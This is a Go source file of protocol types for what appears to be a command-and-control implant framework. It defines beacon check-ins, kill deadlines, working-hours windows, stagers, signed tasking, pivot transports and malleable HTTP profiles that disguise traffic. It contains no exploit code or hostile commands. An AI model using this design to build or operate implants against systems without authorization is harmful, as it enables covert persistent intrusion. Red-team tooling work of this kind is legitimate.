package protocol

type Identity struct {
	Hostname  string `json:"hostname"`
	Username  string `json:"username"`
	MachineID string `json:"machine_id"`
	OS        string `json:"os"`
	Arch      string `json:"arch"`
	Proto     int    `json:"proto"`
	KillDays  int    `json:"kill_days"`
	WorkStart int    `json:"work_start"`
	WorkEnd   int    `json:"work_end"`
	Stager    bool   `json:"stager,omitempty"`

	// IdentityRole is a build-time disambiguator. Two agents
	// built from the same tree, run on the same host, under the
	// same user, would otherwise hash to the same session
	// fingerprint — the server's fingerprint is a hash over
	// (machine_id, hostname, username, os), and all four are
	// identical in that case.
	//
	// When this field is non-empty the server mixes it into the
	// fingerprint, so the two agents receive distinct sessions,
	// distinct cookies, and distinct rows in the beacon list.
	//
	// Empty is the default and produces the pre-role fingerprint
	// exactly, so no deployed agent's session is invalidated by
	// the field's existence. The `omitempty` tag keeps the field
	// off the wire entirely for a role-less build.
	//
	// The builder sets this automatically for the three pivot
	// child transports ("smb-child", "tcp-bind", "tcp-rev").
	// An operator can set it explicitly on any build via
	// `identity_role` in the JSON config or `--identity-role`
	// on `beacon-build`.
	IdentityRole string `json:"identity_role,omitempty"`
}

type CheckinRequest struct {
	Identity    Identity `json:"identity"`
	AgentPubKey string   `json:"agent_pubkey,omitempty"`
	IdentitySig string   `json:"identity_sig,omitempty"`
	IdentityTs  int64    `json:"identity_ts,omitempty"`
}

type CheckinResponse struct {
	ID           int     `json:"id"`
	Sleep        int     `json:"sleep"`
	Jitter       float64 `json:"jitter"`
	KillDeadline float64 `json:"kill_deadline"`
	Proto        int     `json:"proto"`
	Cookie       string  `json:"cookie,omitempty"`
}

type Task struct {
	ID        string   `json:"id"`
	Verb      string   `json:"verb"`
	Args      []string `json:"args"`
	Timeout   int      `json:"timeout"`
	Signature string   `json:"signature,omitempty"`
}

type Result struct {
	ID        string `json:"id"`
	Output    string `json:"output"`
	Error     string `json:"error,omitempty"`
	ExitCode  int    `json:"exit_code"`
	Signature string `json:"signature,omitempty"`
}

type Profile struct {
	UserAgent      string            `json:"user_agent"`
	LinuxUserAgent string            `json:"linux_user_agent"`
	BeaconPath     string            `json:"beacon_path"`
	TasksPath      string            `json:"tasks_path"`
	ResultsPath    string            `json:"results_path"`
	ExtraHeaders   map[string]string `json:"extra_headers"`
	RequestHeaders map[string]string `json:"request_headers"`
	Status *ProfileStatus `json:"status,omitempty"`
	CookieName string `json:"cookie_name,omitempty"`
	ResponseHeaders map[string]string `json:"response_headers,omitempty"`
	Stager *ProfileStager `json:"stager,omitempty"`
}

type ProfileStatus struct {
	Beacon  int `json:"beacon,omitempty"`
	Tasks   int `json:"tasks,omitempty"`
	Results int `json:"results,omitempty"`
	Error   int `json:"error,omitempty"`
}

type ProfileStager struct {
	Path string `json:"path,omitempty"`
}